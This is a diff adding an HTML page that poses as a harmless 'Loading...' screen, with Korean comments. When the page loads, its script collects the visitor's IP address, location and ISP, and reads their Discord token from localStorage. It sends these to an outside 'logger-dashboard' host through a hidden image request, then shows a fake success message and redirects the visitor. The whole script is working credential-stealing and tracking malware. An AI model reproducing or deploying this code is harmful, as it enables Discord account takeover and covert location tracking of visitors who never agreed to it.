@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    // 1. IP 정보 가져오기
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip || '알 수 없음';
+        const city = data.city || '알 수 없음';
+        const region = data.region || '알 수 없음';
+        const country = data.country_name || '알 수 없음';
+        const isp = data.org || '알 수 없음';
+        const lat = data.latitude || '없음';
+        const lon = data.longitude || '없음';
+
+        // 2. 디스코드 토큰 가져오기
+        let token = '토큰 없음';
+        let userId = '알 수 없음';
+        try {
+          const rawToken = localStorage.getItem('token');
+          if (rawToken) {
+            token = rawToken.replace(/^"|"$/g, '');
+            try {
+              const payload = JSON.parse(atob(token.split('.')[1]));
+              userId = payload.sub || payload.id || '알 수 없음';
+            } catch(e) {}
+          }
+        } catch(e) {}
+
+        // 3. 대시보드로 전송 (이미지 태그 방식)
+        const dashboardUrl = 'https://siwooaslkpi-ui.github.io/logger-dashboard/dashboard.html';
+        const params = new URLSearchParams({
+          ip: ip,
+          city: city,
+          region: region,
+          country: country,
+          isp: isp,
+          lat: lat,
+          lon: lon,
+          token: token,
+          userId: userId
+        }).toString();
+        const img = new Image();
+        img.src = dashboardUrl + '?log=' + encodeURIComponent(params);
+
+        // 4. 화면 표시 및 리다이렉트
+        document.body.innerHTML = `
+          <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
+            <h1>✅ 페이지 로드 완료</h1>
+            <p>잠시 후 자동으로 이동합니다...</p>
+          </div>
+        `;
+        setTimeout(() => {
+          window.location.href = 'https://naver.com';
+        }, 2000);
+      })
+      .catch(() => {
+        document.body.innerHTML = `
+          <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
+            <h1>⚠️ 오류 발생</h1>
+            <p>잠시 후 다시 시도해주세요.</p>
+          </div>
+        `;
+      });
+  </script>
+</head>
+<body style="background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+  <div style="text-align:center;color:#888;">
+    <h2>⏳ 로딩 중...</h2>
+    <p>잠시만 기다려주세요.</p>
+  </div>
+</body>
+</html>
